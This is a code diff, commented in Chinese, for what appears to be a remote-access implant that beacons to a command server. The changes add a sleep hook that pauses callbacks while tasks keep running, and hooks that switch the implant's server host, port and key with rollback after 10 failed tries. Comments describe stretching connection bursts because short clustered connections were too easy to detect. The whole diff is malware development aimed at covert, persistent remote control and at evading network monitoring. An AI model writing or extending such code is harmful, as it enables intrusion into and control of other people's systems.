@@ -224,6 +224,7 @@ def sleep_jitter():
 def cycle():
     global CONN_KEY
     conn = None
+    ok = False
     try:
         conn = _T()          # 可能更新 _CK(_disp 连接成功设置层密钥)
         CONN_KEY = _CK       # 直连=_K(set_key 生效);uplevel 后=当前通道层密钥
@@ -233,9 +234,10 @@ def cycle():
             msg = js.loads(recv_frame(conn).decode())
             mtype = msg.get("type")
             if mtype == "welcome":
+                ok = True  # 认证通过 = 新参数验证成功(set_host/key/port 钩子用)
                 break
             if mtype == "error":
-                return
+                return False
         # ① 上报已完成结果(逐条: 发一帧收一帧,收确认 + 顺带任务)
         with _PENDING_LOCK:
             pending = list(_PENDING.items())
@@ -246,9 +248,9 @@ def cycle():
             if mtype == "tasks":
                 _handle_tasks(msg)
             elif mtype in ("pong", "error"):
-                return
+                return ok
             else:
-                return
+                return ok
         # ② 请求并领取全部待执行任务(TASKS 帧可能多批,空批或 PONG 即取完)
         send_frame(conn, js.dumps({"type": "fetch"}).encode())
         while True:
@@ -260,8 +262,9 @@ def cycle():
                     break  # 空批 = 取完(agent 一问一答模式下 server 无更多任务)
             elif mtype in ("pong", "error"):
                 break
+        return ok
     except Exception:
-        pass
+        return False
     finally:
         if conn is not None:
             try:
@@ -274,7 +277,40 @@ _burst_left = 0
 while True:
     if _B:
         break
-    cycle()
+    # sleep 模块钩子: 主循环整体睡眠(暂停回连)——任务线程(_run_one_task)
+    # 照常执行, 结果暂存 _PENDING, 醒后下一轮 cycle 一并上报。
+    # 用 globals() 字符串键读写, minify 安全(变量名被压缩也不影响)。
+    _slp = globals().get("_SLP_UNTIL", 0)
+    if _slp > tm.time():
+        tm.sleep(_slp - tm.time())
+        continue
+    # set_host/set_key/set_port 验证钩子: 新参数 pending 时本轮用新值回连,
+    # 成功(welcome)即正式生效并清 pending; 失败计数, 连续 10 次失败回退
+    # 旧参数(_SET_BACKUP 保存旧 host/port/key, 回退后 _H/_P/_K 恢复原值)。
+    _sp = globals().get("_SET_PENDING")
+    if _sp:
+        if "_SET_BACKUP" not in globals():
+            globals()["_SET_BACKUP"] = (_H, _P, _K)
+        _H = _sp.get("host", _H)
+        _P = _sp.get("port", _P)
+        if "key" in _sp:
+            _K = _sp["key"]
+            _CK = _sp["key"]
+    _ok = cycle()
+    if _sp:
+        if _ok:
+            globals().pop("_SET_PENDING", None)
+            globals().pop("_SET_BACKUP", None)
+            globals().pop("_SET_TRY", None)
+        else:
+            _tr = globals().get("_SET_TRY", 0) + 1
+            globals()["_SET_TRY"] = _tr
+            if _tr >= 10:
+                _H, _P, _K = globals()["_SET_BACKUP"]
+                _CK = _K
+                globals().pop("_SET_PENDING", None)
+                globals().pop("_SET_BACKUP", None)
+                globals().pop("_SET_TRY", None)
     if _burst_left:
         _burst_left -= 1
         # 突发间隔 5-15s(原 1-3s 成簇短连特征太明显,拉长后仍短于主体间隔)
